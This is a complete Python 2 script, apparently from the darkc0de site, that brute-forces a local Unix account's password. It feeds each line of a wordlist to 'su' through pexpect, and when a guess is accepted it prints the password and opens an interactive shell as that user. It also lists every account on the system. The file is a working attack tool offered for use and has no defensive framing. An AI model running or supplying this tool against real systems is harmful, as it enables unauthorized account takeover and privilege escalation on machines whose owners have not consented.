#!/usr/bin/python
#Local Account BruteForcer

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, pwd
try:
	import pexpect
except(ImportError):
	print "\nYou need the pexpect module."
	print "http://www.noah.org/wiki/Pexpect\n"
	sys.exit(1)

#Change this if needed.
LOGIN_ERROR = 'su: incorrect password'

def brute(word):
	print "Trying:",word
	child = pexpect.spawn ('su '+user)
	child.expect ('Password: ')
	child.sendline (word)
	i = child.expect([LOGIN_ERROR, pexpect.TIMEOUT], timeout=5)
	if i  == 1:
		print "\n\t[!] Password:",word
		child.sendline ('whoami')
		print child.before
		child.interact()
	#if i = 0:
		#print "Incorrect Password"
	
if len(sys.argv) != 3:
	print "\nUsage : ./accbrute.py <user> <wordlist>"
	print "Eg: ./accbrute.py d3hydr8 words.txt\n"
	sys.exit(1)

user = sys.argv[1]
users = []
for x in pwd.getpwall():
	users.append(x[0])
if user not in users:
	print "\n[-] User not found\n"
	sys.exit(1)
	
print "\n[+] Found:",len(users),"users"
try:
	words = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
  	sys.exit(1)
	
print "\n[+] Loaded:",len(words),"words"
print "[+] User:",user
print "[+] BruteForcing...\n"
for word in words:
	brute(word.replace("\n",""))
